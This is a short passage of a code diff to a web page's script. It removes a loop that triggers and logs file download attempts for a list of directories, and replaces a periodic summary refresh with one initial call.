-                        downloadLink.click();
-                        
-                        logResult('contentResults', `📥 DOWNLOAD ATTEMPT: ${directory}`, 'success');
-                        
-                        document.body.removeChild(downloadLink);
-                        
-                    } catch (e) {
-                        logResult('contentResults', `✗ DOWNLOAD FAILED: ${directory} - ${e.message}`, 'error');
-                    }
-                });
-            });
-        }
-
-        // Update summary every 5 seconds
-        setInterval(updateSummary, 5000);
-
-        // Initial summary
+        // Initialize summary
         updateSummary();
     </script>
 </body>
